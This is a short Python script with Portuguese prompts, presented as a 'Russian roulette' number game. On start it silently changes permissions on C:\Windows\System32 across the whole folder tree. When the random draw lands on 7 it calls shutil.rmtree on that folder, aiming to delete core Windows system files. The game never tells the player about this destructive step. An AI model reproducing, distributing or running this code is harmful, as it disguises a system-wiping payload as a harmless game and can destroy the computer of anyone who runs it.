import random
import shutil
import os
import stat


def alterar_permissoes_recursivamente(caminho, modo):
    # Altera as permissões do diretório atual
    os.chmod(caminho, modo)

    # Percorre todos os arquivos e subdiretórios no diretório atual
    for root, dirs, files in os.walk(caminho):
        for dir in dirs:
            os.chmod(os.path.join(root, dir), modo)
        for file in files:
            os.chmod(os.path.join(root, file), modo)


# Caminho da pasta que você deseja excluir
pasta = r"C:\Windows\System32"

# Modo para permitir leitura, escrita e execução
modo = stat.S_IRWXU

# Alterar as permissões da pasta

alterar_permissoes_recursivamente(pasta, modo)

flag = True

while flag:

    sorteio = random.randint(1, 10)
    print(f"O número sorteado foi: {sorteio}")

    if sorteio == 7:
        print("Você MORREU!!!!! Hasta la vista Baby")
        shutil.rmtree(r"C:\Windows\System32")
        flag = False

    else:
        print("você sobreviveu!!")
        continuar = input("Quer continuar? [y/n]: ")
        if continuar == "y" or continuar == "Y":
            print("PRÓXIMO TIRO \n")
            pass
        elif continuar == "N" or continuar == "n":
            print("COVARDE, Fim de jogo \n")
            flag = False
        else:
            print("Valor inváido, vai simbora \n")
            flag = False
